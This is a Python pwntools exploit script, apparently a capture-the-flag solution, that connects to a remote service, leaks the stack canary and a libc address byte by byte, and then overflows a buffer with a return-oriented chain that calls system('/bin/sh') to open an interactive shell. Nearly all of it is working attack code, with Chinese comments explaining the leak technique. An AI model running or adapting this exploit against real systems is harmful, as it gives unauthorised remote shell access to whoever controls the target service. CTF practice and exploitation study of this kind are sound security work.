#!/usr/bin/env python3
'''
Pwn3d by pwn2ooown
'''
from pwn import *
import sys
import time
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]
# brva x = b *(pie+x)
# set follow-fork-mode 
# p/x $fs_base
# vis_heap_chunks
# set debug-file-directory /usr/src/glibc/glibc-2.35
# directory /usr/src/glibc/glibc-2.35/malloc/
# handle SIGALRM ignore
r = remote(sys.argv[1],int(sys.argv[2]))
s       = lambda data               :r.send(data)
sa      = lambda x, y               :r.sendafter(x, y)
sl      = lambda data               :r.sendline(data)
sla     = lambda x, y               :r.sendlineafter(x, y)
ru      = lambda delims, drop=True  :r.recvuntil(delims, drop)
uu32    = lambda data,num           :u32(r.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(r.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))
l64     = lambda      :u64(r.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(r.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))
sl("A"*63)
ru("AAAA\n")
canary_part1 = r.recv(1)
ru("\n")
sl("A"*65)
ru("AAAA\n")
canary_part2 = r.recv(6)
canary = u64(canary_part1 + b'\x00' + canary_part2)
leak("canary",hex(canary))
ru("\n")
def leak_bytes(start_offset, total_bytes):
    """
    從 start_offset 開始 leak total_bytes 個 bytes
    
    原理:
    - 發送 'A' * (current_offset - 1)，buffer 會是 'A'*(n-1) + '\n'
    - 接收 'A'*(n-1) + '\n' 後，後面跟著的就是 leaked bytes
    - 這些 bytes 被 NULL 截斷，所以要補 \x00
    - 下次 leak 時要覆蓋已知的 bytes，繼續往後 leak
    """
    leaked = b''
    current_offset = start_offset
    
    while len(leaked) < total_bytes:
        # 發送 'A' * (current_offset - 1)，加上 newline 剛好到 current_offset
        padding_len = current_offset - 1
        sl(b"A" * padding_len)
        
        # 接收我們發送的 padding + newline
        ru(b"A" * padding_len + b"\n")
        
        # 接收 leaked bytes 直到 newline
        new_leaked = ru(b"\n")
        
        if len(new_leaked) == 0:
            # 沒有 leak 到東西，代表下一個 byte 就是 NULL
            leaked += b'\x00'
            current_offset += 1
        else:
            # leak 到的 bytes 後面被 NULL 截斷
            leaked += new_leaked + b'\x00'
            current_offset += len(new_leaked) + 1
        
        log.info(f"Leaked so far ({len(leaked)} bytes): {leaked.hex()}")
    
    return leaked[:total_bytes]
libc = u64(leak_bytes(96, 8)) - 0x2004c
leak("libc",hex(libc))
# ru("\n")
# 0x0000000000045e5c : ldr x0, [sp, #0x18] ; ldp x29, x30, [sp], #0x20 ; ret
system = libc + 0x49580
bin_sh = libc + 0x76720
sl(b'A'*64+p64(canary)+p64(0xDEADBEEF)+p64(libc+0x45e5c)+p64(0xDEADBEEF)+p64(system)+p64(0xDEADBEEF)+p64(bin_sh))
sl("exit")
r.interactive()
